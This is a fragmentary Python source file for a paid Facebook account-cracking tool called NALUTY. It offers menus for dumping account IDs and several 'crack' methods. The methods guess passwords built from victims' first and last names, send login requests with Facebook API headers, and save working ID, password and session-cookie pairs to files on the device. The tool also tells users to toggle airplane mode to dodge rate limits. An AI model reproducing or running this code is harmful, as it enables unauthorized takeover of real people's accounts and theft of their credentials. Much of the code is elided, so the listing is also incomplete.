...
\033[1;37           
\033[1;37m------------------------------------------------
\033[1;37m\033[91m Owner   :            @ » UUOOOL
\033[1;37m\033[92m TELE    :            https://t.me/H12H5        
\033[1;37m \033[93mGithub  :            NALUTY01
\033[1;37m\033[96m Version :            0.1
\033[1;37m\033[95m TYP     :            PAID\033[1;37m
----------------------------------------------- """
def clear():
    os.system("clear")
    print(logo)    
...
def sarfraz():   
    ...
    print(f'[3] Login Tool')
    print(f'[4] Logout Cookie')
    print(f'[5] Remove Trash Files ')
    print(f'[6] Separate Ids')
    print(f'[7] Remove Duplicate IDs')
    
    print('')
    select = input('  \033[90mChoose an option: ')
    if select =='1':
        method_crack()
    elif select =='2':
       menu()
...
def method_crack():
    ...
    print(f'[0] Back')
    print('')
    option = input('   \033[91mCHOSE METHOD : ')
    if option =='1':
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        self.file = input('    \033[91mPut File Name : ')
        try:
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NALUTY-M1] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NALUTY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NALUTY_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NALUTY_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SK MH-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NALUTY_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NALUTY-M1] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NALUTY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NALUTY_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NALUTY_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SK MH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NALUTY-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[NALUTY-M2] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [NALUTY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NALUTY_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            pw = []
            clear()
            print(" \033[92mPut limit pass /MAX»30")
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{A}[Example: first123, last1122, firstlast, last, ETC]')
            print('')
            if sl =='':
                print('\n Put limit Pass /MAX»30')
            elif sl > 20:
                print('\nPassword limit 30')
            else:
                for sr in range(sl):
            ...
            print(f"\r{S} Use airplane mode every 10 minutes for 5 seconds  {S}")
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/NALUTY.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/NALUTY.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back NALUTY Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/NALUTY.txt\n') 
        filepath = input("Put File Name: ")
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back NALUTY Menu ")
        SKMH(allkey)
    except Exception as e:
        print("Error : %s"%e) 
